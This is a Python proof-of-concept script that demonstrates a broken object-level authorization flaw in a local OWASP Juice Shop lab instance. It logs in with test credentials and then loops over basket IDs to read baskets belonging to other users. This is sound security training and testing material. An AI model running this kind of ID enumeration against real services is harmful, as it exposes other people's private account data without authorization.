#!/usr/bin/env python3
"""
BOLA Vulnerability Demo - OWASP Juice Shop
Target: http://127.0.0.1:8081
"""

import urllib.request
import urllib.parse
import json

def login():
    """Login and return JWT token and basket ID"""
    url = "http://127.0.0.1:8081/rest/user/login"
    data = {
        "email": "tester@lab.test",
        "password": "Labtest123!"
    }
    req = urllib.request.Request(url, 
        data=urllib.parse.urlencode(data).encode(),
        headers={"Content-Type": "application/x-www-form-urlencoded"})
    resp = urllib.request.urlopen(req)
    return json.loads(resp.read())

def get_basket(basket_id, token):
    """Get basket details"""
    url = f"http://127.0.0.1:8081/rest/basket/{basket_id}"
    req = urllib.request.Request(url,
        headers={"Authorization": f"Bearer {token}"})
    resp = urllib.request.urlopen(req)
    return json.loads(resp.read())

def main():
    # Login
    auth = login()
    token = auth["authentication"]["token"]
    basket_id = auth["authentication"]["bid"]
    
    # Get your basket
    your_basket = get_basket(basket_id, token)
    print(f"Your basket ID: {basket_id}, UserId: {your_basket['userId']}, Items: {len(your_basket['items'])}")
    
    # Check other baskets
    for id in range(1, 5):
        try:
            basket = get_basket(id, token)
            if basket["userId"] != your_basket["userId"]:
                print(f"Basket {id}: UserId {basket['userId']} (not yours)")
            else:
                print(f"Basket {id}: UserId {basket['userId']} (yours)")
        except Exception as e:
            print(f"Error fetching basket {id}: {e}")

if __name__ == "__main__":
    main()
